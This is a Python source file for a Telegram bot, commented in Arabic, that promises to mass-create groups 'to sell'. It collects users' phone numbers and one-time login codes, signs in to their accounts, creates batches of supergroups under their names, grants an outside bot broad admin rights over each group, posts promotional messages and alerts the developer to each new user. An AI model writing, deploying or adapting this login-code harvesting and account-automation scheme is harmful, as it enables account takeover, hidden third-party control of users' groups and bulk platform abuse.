import os
import asyncio
from telethon import TelegramClient, events, Button, functions, types
from telethon.sessions import StringSession

# ---------- إعدادات عامة ----------
api_id = int(os.environ.get("API_ID"))
api_hash = os.environ.get("API_HASH")
bot_token = os.environ.get("BOT_TOKEN")

# قناة الاشتراك الإجباري
force_channel = os.environ.get("FORCE_CHANNEL")  # بدون @
# حساب المطور / مالك البوت
developer_username = os.environ.get("DEVELOPER_USERNAME")  # بدون @
# بوت إضافي لإضافة كمشرف (اختياري)
admin_bot_username = os.environ.get("ADMIN_BOT_USERNAME", "czbbbot")

# عدد المجموعات لكل مستخدم
groups_per_user = int(os.environ.get("GROUPS_PER_USER", 15))
# وقت الانتظار بين كل مجموعة (ثواني)
delay_between_groups = int(os.environ.get("DELAY_BETWEEN_GROUPS", 4))

# تخزين جلسات المستخدمين
sessions = {}

# بوت التحكم
bot = TelegramClient("bot", api_id, api_hash).start(bot_token=bot_token)

# ---------- فحص الاشتراك ----------
async def is_subscribed(user_id):
    try:
        result = await bot(functions.channels.GetParticipantRequest(
            channel=force_channel,
            participant=user_id
        ))
        return True if result else False
    except:
        return False

# ---------- إنشاء مجموعة ----------
async def create_supergroup(client, title="AutoGroup"):
    try:
        result = await client(functions.channels.CreateChannelRequest(
            title=title,
            about="تم الإنشاء بواسطة البوت",
            megagroup=True
        ))
        group = result.chats[0]
        return group
    except Exception as e:
        print(f"[FAILED] لم يتم إنشاء المجموعة: {e}")
        return None

# ---------- دعوة البوت كمشرف ----------
async def invite_admin_bot(client, channel):
    try:
        bot_entity = await client.get_entity(f"@{admin_bot_username}")
        await client(functions.channels.InviteToChannelRequest(
            channel=channel,
            users=[bot_entity]
        ))
        rights = types.ChannelAdminRights(
            change_info=True, post_messages=True, edit_messages=True,
            delete_messages=True, ban_users=True, invite_users=True,
            pin_messages=True, add_admins=False
        )
        await client(functions.channels.EditAdminRequest(
            channel=channel,
            user_id=bot_entity,
            admin_rights=rights,
            rank="Moderator"
        ))
    except Exception as e:
        print(f"[FAILED] إضافة وترقية البوت: {e}")

# ---------- إرسال رسائل داخل المجموعة ----------
messages_to_send = [
    "هلوو",
    "شلونكم",
    "شني @e2e12",
    "يلاا",
    "ميخالف"
]

async def send_messages(client, channel):
    for msg in messages_to_send:
        try:
            await client.send_message(channel, msg)
            await asyncio.sleep(1)
        except Exception as e:
            print(f"[FAILED] إرسال {msg}: {e}")

# ---------- الأوامر ----------
@bot.on(events.NewMessage(pattern="/start"))
async def start_handler(event):
    buttons = [
        [Button.inline("➕ إنشاء مجموعات", data="create_groups")],
        [Button.url("👨‍💻 المطور", f"https://t.me/{developer_username}")]
    ]
    text = "👋 أهلاً بك بدايةً أشترك @Qd3Qd !\n بك في بوتنا المميز من نوعه/n • يمكنك صنع مجموعات تصل الى 500 مجموعه وبيعها."
    await event.respond(text, buttons=buttons)

# ---------- زر إنشاء مجموعات ----------
@bot.on(events.CallbackQuery(data=b"create_groups"))
async def callback_create_groups(event):
    user_id = event.sender_id
    if not await is_subscribed(user_id):
        await event.answer("❌اشترك حبيبي وأرسل /start!", alert=True)
        return
    sessions[user_id] = {"step": "phone"}
    await event.respond("📞 أرسل رقم هاتفك (بصيغة +964...)")

# ---------- استقبال رقم الهاتف أو الكود ----------
@bot.on(events.NewMessage)
async def handle_messages(event):
    user_id = event.sender_id
    if user_id not in sessions:
        return

    step = sessions[user_id].get("step")

    # --- الخطوة الأولى: الرقم ---
    if step == "phone":
        phone = event.raw_text.strip()
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        try:
            await client.send_code_request(phone)
            sessions[user_id] = {"step": "code", "phone": phone, "client": client}
            await event.respond("📩 أرسل رمز التأكيد الذي وصلك.")
        except Exception as e:
            await event.respond(f"❌ خطأ: {e}")

    # --- الخطوة الثانية: الكود ---
    elif step == "code":
        code = event.raw_text.strip()
        client = sessions[user_id]["client"]
        phone = sessions[user_id]["phone"]
        try:
            await client.sign_in(phone, code)
            session_string = client.session.save()
            sessions[user_id] = {"step": "done", "session": session_string}
            await event.respond("✅ تم تسجيل الدخول بنجاح! سيتم الآن إنشاء المجموعات.")

            # إشعار لمالك البوت
            await bot.send_message(f"@{developer_username}", f"😂👤 مستخدم جديد بدأ استخدام البوت: {user_id}")

            # إنشاء المجموعات
            user_client = TelegramClient(StringSession(session_string), api_id, api_hash)
            await user_client.start()
            success_count = 0
            for i in range(groups_per_user):
                title = f"AutoGroup_{user_id}_{i}"
                group = await create_supergroup(user_client, title)
                if group:
                    success_count += 1
                    await invite_admin_bot(user_client, group)
                    await send_messages(user_client, group)
                await asyncio.sleep(delay_between_groups)

            await event.respond(f"😂✅ تم إنشاء {success_count} مجموعة بنجاح!")

        except Exception as e:
            await event.respond(f"❌ رمز غير صحيح أو خطأ: {e}")

# ---------- تشغيل البوت ----------
print("🤖 Bot is running...")
bot.run_until_disconnected()
